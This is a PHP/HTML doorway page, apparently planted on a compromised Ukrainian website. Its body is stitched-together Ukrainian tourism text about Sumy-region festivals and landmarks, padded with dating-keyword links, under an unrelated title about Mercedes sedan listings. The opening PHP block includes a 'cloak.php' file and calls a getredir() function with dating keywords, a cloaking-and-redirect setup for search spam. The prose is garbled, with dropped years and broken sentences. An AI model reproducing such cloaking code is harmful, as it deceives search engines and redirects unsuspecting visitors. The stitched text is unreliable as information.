<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%87%d0%b0%d1%81%d0%b8+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%a2%d1%80%d0%be%d1%81%d1%82%d1%8f%d0%bd%d0%b5%d1%86%d1%8c+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>3 200+ объявлений о продаже Седанов Mercedes-Benz</title>
	<meta name="description" content="Тростянець – прадавня українська земля, край джерельно-чистих річок і озер​, Є інші Тростянці в Україні, але наш, рідний, по своїй чарівності, красі" />
	<link rel="canonical" href="https://masage.od.ua/img/208/fehof-chasi-znayomstv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/cutu-eksklyuzivna-sluzhba-znayomstv.php">ексклюзивна служба знайомств Рівне Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/280/gelub-regon-znayomstv.php">регіон знайомств Перевальськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/huva-talya-znayomstva-v.php">Італія знайомства в Корсунь-Шевченківський Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/mose-hristiyanske-msto-znayomstv.php">християнське місто знайомств Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/dyjer-shvidksn-znayomstva.php">швидкісні знайомства людина поруч Долина Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Часи знайомств Тростянець Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Традиційне обласне свято «Віншуємо суницю — першу ягоду-царицю».</p><a id='d1'></a><h3>Фестиваль «Органум»</h3><p>Минулого року там спекли найбільший полуничний пиріг — довжиною 43 метри 97 сантиметрів. Його занесли до Книги рекордів Гіннеса України. На які рекорди чекати цього року?</p>
		
	<p>Всеукраїнський фестиваль «Козацький родослав» відзначатимуть у рамках святкування в Сумській області ї річниці перемоги війська Івана Виговського у Конотопській битві. На відвідувачів чекають численні концерти, козацькі розваги та українська кухня. Вперше відбувся у липні року.</p><strong><a id='d2'></a><h2>Екскурсії Східною Україною</h2></strong><p>Нині фестиваль відбудеться вже всьоме. Щороку Схід-рок дає можливість молодим колективам виступити на одній сцені з монстрами української рок-музики. Фестиваль проводять у фортеці XVIII століття — Круглий Двір. Можна не лише слухати музику, відпочивати з друзями і знаходити нових знайомих, але й насолоджуватися старовинною архітектурою. Всеукраїнський сільський фестиваль-конкурс мистецтв «Боромля» — єдине в Україні професійне сільське мистецьке свято.</p>
<p>Воно проводиться щорічно Тростянці, Сумах та селах Сумської області. Гала-концерт проводиться у селі Боромля. На гостей чекають концерти за участю майстрів мистецтв і художніх колективів, концерти симфонічної, камерної і народної музики, концерти за участю лауреатів конкурсу та гостей фестивалю. У вересні відбудеться й Міжнародний літературно-мистецький фестиваль «Кролевецькі рушники». Фест збирає поетів, письменників, художників, майстрів декоративно-прикладного мистецтва, мистецтвознавців, художніх колективів та окремих виконавців з різних регіонів України.</p>
<p>Гоголю; - Відвідування унікального в Україні музею «Поштова станція», де ви побачите унікальні експонати, пов'язані з нелегкою роботою пошти часів Т. Шевченко і О. Глінки, човнового причалу, "романтичних руїн", господарський двір та Георгіївська церква ; - Вільний час на пікнік на природі; - Екскурсія Тростянецьким дендропарком, одним з найкрасивіших ландшафтних парків України, створений нащадком відомого роду Скоропадських, дізнаємось безліч легенд та цікавих історій повязаних з парком і не тільки; - Переїзд в Сокиринці; - Екскурсія садибою Галаганів, під час якої ми побачимо внутрішні інтер'єри палацу та прогуляємось парком; Переїзд до Дніпра Зверніть увагу!</p><strong><a id='d3'></a><h2>Екскурсії по Україні, екскурсійні тури УкраїноюEtnoSvit</h2></strong><p>Прибуття заплановано пізно в ночі ;. Це й не дивно, адже колись село Волокитине було відомим далеко за межами Російської імперії.</p><img src="https://ukrainer.net/wp-content/uploads/2019/11/14-13.jpg" alt="Підпишись на розсилку і дізнайся першим про наші пропозиції!" style="max-width: 480px; max-height: 480px;"/><p>А все завдяки порцеляні, що її виготовляли на місцевій порцеляновій мануфактурі, яку завбачливо звів тут колишній власник маєтку Андрій Миклашевський. Сьогодні немає ні садиби, ні Покровської церкви з унікальним порцеляновим іконостасом. Усе зруйнувала радянська влада у х роках ХХ ст. Але волокитинські порцелянові вироби зберігаються в музеях не лише України, а й США, Фінляндії, Франції та Росії. До села дістатися непросто.</p>
<p>Старовинна бруківка перевірятиме на міцність ваші нерви декілька кілометрів, але їхати варто.</p>
		
			<br><ol>
			
				<li>понад 40 швидкісних побачень поблизу Снігурівка Україна.</li>
			
				<li>Екскурсії по Східній Україні - Навігатор Україна.</li>
			
				<li>азіатські швидкісні знайомства в Миколаївка Україна;</li>
			
				<li>побачення знову Дружківка Україна?</li>
			
				<li>безкоштовні програми для знайомств - Мелітополь Україна?</li>
			
				<li>Знайомства Тростянець.</li>
			
			</ol>
		
	<p>Раптом вам пощастить знайти шматочок порцеляни у парку — свідка розквіту Волокитиного у позаминулому столітті. Село Полошки Глухівського району знаходиться поза межами туристичних маршрутів, але я ніяк не можу виключити його зі свого списку. Бо трохи більше, ніж сто років тому Полошки були власністю останнього гетьмана України — Павла Скоропадського. Тут він проводив літо з дружиною та дітьми, насолоджувався спокоєм і місцевою природою. На жаль, родовий маєток гетьмана було зруйновано за радянських часів, а на його місці побудовано клуб.</p>
<p>Важко уявити подорож Сумщиною без зупинки в давньому містечку Вороніж, заснованому ще в році. Саме тут вже чотири віки стоїть церква, яку називають архітектурним шедевром Лівобережжя. Михайлівська церква була збудована в — роках у стилі популярного на ті часи козацького бароко. Втім, храм має свою родзинку: синтез архітектури зі скульптурою, що робить сакральну споруду напрочуд оригінальною.</p>
<p>Автор проєкту залишається для нас невідомим, але припускають, що ним міг бути видатний український архітектор Іван Григорович-Барський, «батько» київської Покровської церкви та собору Різдва Богородиці в Козельці. Ось у місті Кролевець є природне диво, яке не має аналогів в Україні, — яблуня-колонія. Яблуневий кущ із гілками, переплетеними, наче змії, безсумнівно приваблює своєю химерною формою.</p>
<p>Втім, він також має неперевершену здатність до самостійного вкорінення гілками, отже — до продовження життя. Для поціновувачів літератури додам: у Кролевці народився видатний український перекладач Микола Лукаш і неодноразово бував, і навіть жив, Тарас Шевченко. Конотопська вежа Шухова стоїть фактично в центрі міста і вже не дивує нікого з місцевих.</p>
		
	<p>Колишня водонапірна вежа була пошкоджена в часи Другої світової війни, тоді ж перестала функціонувати, а сьогодні, на жаль, поступово руйнується. Але насправді вона заслуговує на реставрацію та величезну увагу, зважаючи на своє авторство. Творчість російського інженера Володимира Шухова порівнюють із відомим на весь світ Гюставом Ейфелем. Вони обидва створювали ажурні й легкі, але водночас міцні споруди, здатні стояти віками. І хоча Шухов не отримав навіть половини від тієї слави, яка дісталася французькому колезі по цеху, його внесок в історію світової архітектури неоціненний.</p>
<p>Шухов створив цілу низку унікальних гіперболоїдних конструкцій, частина з яких знаходиться на території України. До речі, найбільш знані в нашій країні «родичі» конотопської залізної красуні «живуть» на Херсонщині і звуть їх Аджигольські маяки. Скіфські кургани зустрічаються по всій території сучасної України. Однак їхня кількість на Сумщині настільки велика, що вчені виокремили цілу групу — Посульські кургани.</p>
<p>Знаходяться скіфські поховання VI-V століть до нашої ери в Роменському районі, неподалік сіл Пустовійтівка і Великі Будки. Але місцеві заспокоюють: «Не бійтеся, тут і трактори їздять». Перевірено — їхати можна! Точна адреса — село Кулішівка Недригайлівського району.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/377/tawah-zona-znayomstv.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/237/fogev-vlasn-svatannya.php">власні сватання на Новоград-Волинський Україна</a></li><li><a href="https://masage.od.ua/img/418/hem-znayomstva-z.php">знайомства з дівчиною з Роздільна Україна</a></li><li><a href="https://masage.od.ua/img/208/veke-naykrashe-mstse.php">найкраще місце підключення в Золоте Україна</a></li><li><a href="https://masage.od.ua/img/137/rizi-zona-shvidksnih.php">зона швидкісних знайомств Вугледар Україна</a></li><li><a href="https://masage.od.ua/img/494/xyhy-ponad-40-shvidksnih.php">понад 40 швидкісних побачень у Гребінка Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#d1'>Фестиваль «Органум»</a></li>
<li><a href='#d2'>Екскурсії Східною Україною</a></li>
<li><a href='#d3'>Екскурсії по Україні, екскурсійні тури УкраїноюEtnoSvit</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/280/micox-velik-ochkuvannya.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>